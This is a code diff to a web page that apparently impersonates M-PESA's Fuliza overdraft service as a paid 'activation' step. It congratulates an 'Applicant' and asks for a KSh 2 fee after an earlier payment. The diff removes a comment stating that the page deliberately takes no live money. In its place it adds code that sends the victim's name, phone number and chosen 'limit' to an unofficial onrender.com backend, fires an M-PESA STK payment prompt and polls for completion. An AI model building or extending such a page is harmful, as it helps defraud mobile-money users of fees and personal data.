@@ -167,6 +167,36 @@ p{
     text-align:center;
 }
 
+.consent{
+    margin-top:16px;
+
+    background:#000000;
+
+    border:1px solid #FFFFFF;
+    border-radius:10px;
+
+    padding:13px;
+
+    display:flex;
+    align-items:flex-start;
+
+    gap:10px;
+}
+
+.consent input{
+    width:20px;
+    height:20px;
+    margin:0;
+
+    flex-shrink:0;
+}
+
+.consent label{
+    color:#FFFFFF;
+    font-size:13px;
+    line-height:1.5;
+}
+
 button{
     width:100%;
     padding:15px;
@@ -261,15 +291,15 @@ button:disabled{
 </h1>
 
 <p>
-    Welcome,
+    Congratulations,
     <span class="name" id="name">
         Applicant
     </span>
 </p>
 
 <p>
-    Your previous payment has been
-    successfully confirmed.
+    Your previous payment has been successfully
+    confirmed.
 </p>
 
 <div class="amount">
@@ -277,8 +307,9 @@ button:disabled{
 </div>
 
 <p>
-    To continue with activation, please review
-    the activation fee and tap the button below.
+    To continue with activation, review the
+    activation fee and choose whether you want
+    to proceed.
 </p>
 
 <div class="info">
@@ -311,17 +342,34 @@ button:disabled{
 
 <div class="notice">
 
-    Activation requires a KSh 2 activation fee.
-    Please review the amount before continuing.
+    If you choose to continue, an M-PESA STK
+    prompt for KSh 2 will be sent to the number
+    shown above. Review the amount before
+    confirming the payment on your phone.
+
+</div>
+
+<div class="consent">
+
+    <input
+        type="checkbox"
+        id="consent"
+    >
+
+    <label for="consent">
+        I understand that the activation fee is
+        KSh 2 and I want to proceed with the
+        payment.
+    </label>
 
 </div>
 
 <button
     type="button"
     id="payBtn"
-    onclick="startActivation()"
+    onclick="payActivation()"
 >
-    Continue with Activation
+    Pay KSh 2 Activation Fee
 </button>
 
 <p id="message"></p>
@@ -338,14 +386,22 @@ button:disabled{
 <script>
 
 /* =====================================================
-   FULIZA ACTIVATION
+   FULIZA BACKEND
+===================================================== */
+
+const BACKEND_URL =
+    "https://fuliza-backend-1-o8h6.onrender.com";
+
+
+/* =====================================================
+   ACTIVATION FEE
 ===================================================== */
 
 const ACTIVATION_FEE = 2;
 
 
 /* =====================================================
-   SAVED CUSTOMER DATA
+   CUSTOMER DATA
 ===================================================== */
 
 const savedName =
@@ -366,7 +422,7 @@ const savedPhone =
 
 
 /* =====================================================
-   DISPLAY CUSTOMER DATA
+   DISPLAY NAME
 ===================================================== */
 
 const firstName =
@@ -382,23 +438,89 @@ document.getElementById(
     firstName;
 
 
+/* =====================================================
+   NORMALIZE PHONE
+===================================================== */
+
+function normalizePhone(phone){
+
+    let value =
+        String(phone || "")
+            .trim()
+            .replace(/\s+/g,"")
+            .replace(/-/g,"");
+
+
+    if(
+        value.startsWith("+254")
+    ){
+
+        value =
+            value.substring(1);
+
+    }
+
+
+    if(
+        /^(07|01)\d{8}$/.test(value)
+    ){
+
+        value =
+            "254" +
+            value.substring(1);
+
+    }
+
+
+    return value;
+
+}
+
+
+/* =====================================================
+   DISPLAY PHONE
+===================================================== */
+
+const normalizedSavedPhone =
+    normalizePhone(
+        savedPhone
+    );
+
+
 document.getElementById(
     "phone"
 ).textContent =
-    savedPhone ||
+    normalizedSavedPhone ||
     "Not available";
 
 
 /* =====================================================
-   ACTIVATION
+   CREATE REFERENCE
 ===================================================== */
 
-function startActivation(){
+function createReference(){
+
+    return (
+        "ACT-" +
+        Date.now()
+            .toString(36)
+            .toUpperCase()
+    );
+
+}
+
+
+/* =====================================================
+   PAY ACTIVATION
+===================================================== */
+
+async function payActivation(){
 
     const btn =
         document.getElementById(
             "payBtn"
         );
+
 
     const message =
         document.getElementById(
@@ -406,29 +528,538 @@ function startActivation(){
         );
 
 
-    /*
-       This page intentionally does not initiate
-       a live-money payment.
+    const consent =
+        document.getElementById(
+            "consent"
+        );
 
-       Continue to your authorized payment flow
-       using your payment provider's own
-       implementation.
-    */
+
+    /* -----------------------------------------
+       CUSTOMER CONSENT
+    ----------------------------------------- */
+
+    if(!consent.checked){
+
+        message.textContent =
+            "Please confirm that you want to proceed with the KSh 2 activation fee.";
+
+        return;
+
+    }
+
+
+    /* -----------------------------------------
+       PHONE VALIDATION
+    ----------------------------------------- */
+
+    const phone =
+        normalizePhone(
+            savedPhone
+        );
+
+
+    if(
+        !/^254\d{9}$/.test(phone)
+    ){
+
+        message.textContent =
+            "A valid M-PESA number is required.";
+
+        return;
+
+    }
+
+
+    /* -----------------------------------------
+       CREATE REFERENCE
+    ----------------------------------------- */
+
+    const reference =
+        createReference();
+
+
+    /* -----------------------------------------
+       SAVE ACTIVATION DATA
+    ----------------------------------------- */
+
+    localStorage.setItem(
+        "fulizaaActivationReference",
+        reference
+    );
+
+
+    localStorage.setItem(
+        "fulizaaActivationAmount",
+        ACTIVATION_FEE
+    );
+
+
+    localStorage.setItem(
+        "fulizaaActivationStatus",
+        "SENT"
+    );
+
+
+    /* -----------------------------------------
+       DISABLE BUTTON
+    ----------------------------------------- */
 
     btn.disabled = true;
 
     btn.textContent =
-        "Activation Processing...";
+        "Sending STK Push...";
 
 
     message.textContent =
-        "Activation request is being processed.";
+        "Please wait. Sending the KSh 2 activation prompt to your M-PESA phone...";
 
 
-    localStorage.setItem(
-        "fulizaaActivationStarted",
-        "true"
-    );
+    /* -----------------------------------------
+       SEND TO EXISTING PAYLOR ENDPOINT
+    ----------------------------------------- */
+
+    try{
+
+        const response =
+            await fetch(
+                BACKEND_URL +
+                "/api/stk-push",
+                {
+
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:
+                            phone,
+
+                        amount:
+                            ACTIVATION_FEE,
+
+                        selectedLimit:
+                            Number(
+                                localStorage.getItem(
+                                    "fulizaaSelectedLimit"
+                                ) ||
+                                localStorage.getItem(
+                                    "fulizaaSelectedSlot"
+                                ) ||
+                                0
+                            ),
+
+                        fullName:
+                            savedName,
+
+                        reference:
+                            reference
+
+                    })
+
+                }
+            );
+
+
+        const responseText =
+            await response.text();
+
+
+        let data = {};
+
+
+        if(
+            responseText.trim()
+        ){
+
+            try{
+
+                data =
+                    JSON.parse(
+                        responseText
+                    );
+
+            }catch(error){
+
+                throw new Error(
+                    "Server returned an invalid response."
+                );
+
+            }
+
+        }
+
+
+        console.log(
+            "ACTIVATION STK RESPONSE:",
+            data
+        );
+
+
+        /* -----------------------------------------
+           SERVER ERROR
+        ----------------------------------------- */
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+
+                data.message ||
+                data.error ||
+                "Activation payment request failed."
+
+            );
+
+        }
+
+
+        /* -----------------------------------------
+           SAVE TRANSACTION ID
+        ----------------------------------------- */
+
+        if(
+            data.transactionId
+        ){
+
+            localStorage.setItem(
+                "fulizaaActivationTransactionId",
+                data.transactionId
+            );
+
+        }
+
+
+        if(
+            data.reference
+        ){
+
+            localStorage.setItem(
+                "fulizaaActivationReference",
+                data.reference
+            );
+
+        }
+
+
+        /* -----------------------------------------
+           STK SENT
+        ----------------------------------------- */
+
+        btn.textContent =
+            "Waiting for Payment...";
+
+
+        message.textContent =
+            "M-PESA STK prompt sent. Enter your PIN to complete the KSh 2 activation fee.";
+
+
+        /* -----------------------------------------
+           START STATUS CHECK
+        ----------------------------------------- */
+
+        if(
+            data.transactionId
+        ){
+
+            checkActivationPayment(
+                data.transactionId
+            );
+
+        }else{
+
+            message.textContent =
+                "STK Push was sent, but no transaction ID was returned.";
+
+            btn.disabled = false;
+
+            btn.textContent =
+                "Pay KSh 2 Activation Fee";
+
+        }
+
+
+    }catch(error){
+
+        console.error(
+            "ACTIVATION PAYMENT ERROR:",
+            error
+        );
+
+
+        localStorage.setItem(
+            "fulizaaActivationStatus",
+            "FAILED"
+        );
+
+
+        message.textContent =
+            error.message ||
+            "Unable to send activation payment request.";
+
+
+        btn.disabled =
+            false;
+
+
+        btn.textContent =
+            "Pay KSh 2 Activation Fee";
+
+    }
+
+}
+
+
+/* =====================================================
+   CHECK ACTIVATION PAYMENT
+===================================================== */
+
+function checkActivationPayment(
+    transactionId
+){
+
+    const btn =
+        document.getElementById(
+            "payBtn"
+        );
+
+
+    const message =
+        document.getElementById(
+            "message"
+        );
+
+
+    let attempts = 0;
+
+    const maxAttempts = 100;
+
+
+    if(
+        window.activationChecker
+    ){
+
+        clearInterval(
+            window.activationChecker
+        );
+
+    }
+
+
+    window.activationChecker =
+        setInterval(
+            async function(){
+
+                attempts++;
+
+
+                try{
+
+                    const response =
+                        await fetch(
+
+                            BACKEND_URL +
+                            "/api/payment-status/" +
+                            encodeURIComponent(
+                                transactionId
+                            ),
+
+                            {
+                                method:"GET",
+                                cache:"no-store"
+                            }
+
+                        );
+
+
+                    const data =
+                        await response
+                            .json()
+                            .catch(
+                                () => ({})
+                            );
+
+
+                    console.log(
+                        "ACTIVATION PAYMENT STATUS:",
+                        data
+                    );
+
+
+                    const status =
+                        String(
+                            data.status || ""
+                        ).toUpperCase();
+
+
+                    /* ---------------------------------
+                       COMPLETED
+                    --------------------------------- */
+
+                    if(
+                        status ===
+                        "COMPLETED"
+                    ){
+
+                        clearInterval(
+                            window.activationChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "fulizaaActivationStatus",
+                            "COMPLETED"
+                        );
+
+
+                        if(
+                            data.mpesaReceipt
+                        ){
+
+                            localStorage.setItem(
+                                "fulizaaActivationMpesaReceipt",
+                                data.mpesaReceipt
+                            );
+
+                        }
+
+
+                        btn.textContent =
+                            "Activation Successful";
+
+
+                        message.textContent =
+                            "Congratulations! Your KSh 2 activation fee has been received successfully.";
+
+
+                        /*
+                           Continue only after the backend
+                           confirms COMPLETED.
+                        */
+
+                        setTimeout(
+                            function(){
+
+                                window.location.replace(
+                                    "activation-success.html"
+                                );
+
+                            },
+                            1500
+                        );
+
+
+                        return;
+
+                    }
+
+
+                    /* ---------------------------------
+                       FAILED
+                    --------------------------------- */
+
+                    if(
+                        status ===
+                        "FAILED"
+                    ){
+
+                        clearInterval(
+                            window.activationChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "fulizaaActivationStatus",
+                            "FAILED"
+                        );
+
+
+                        message.textContent =
+                            "The KSh 2 activation payment was not completed.";
+
+
+                        btn.disabled =
+                            false;
+
+
+                        btn.textContent =
+                            "Pay KSh 2 Activation Fee";
+
+
+                        return;
+
+                    }
+
+
+                    /* ---------------------------------
+                       TIMEOUT
+                    --------------------------------- */
+
+                    if(
+                        attempts >=
+                        maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.activationChecker
+                        );
+
+
+                        message.textContent =
+                            "Payment confirmation is taking longer than expected. Please check your M-PESA transaction status before trying again.";
+
+
+                        btn.disabled =
+                            false;
+
+
+                        btn.textContent =
+                            "Pay KSh 2 Activation Fee";
+
+                    }
+
+
+                }catch(error){
+
+                    console.error(
+                        "ACTIVATION STATUS ERROR:",
+                        error
+                    );
+
+
+                    if(
+                        attempts >=
+                        maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.activationChecker
+                        );
+
+
+                        message.textContent =
+                            "Unable to confirm the activation payment right now.";
+
+
+                        btn.disabled =
+                            false;
+
+
+                        btn.textContent =
+                            "Pay KSh 2 Activation Fee";
+
+                    }
+
+                }
+
+            },
+            3000
+        );
 
 }
 
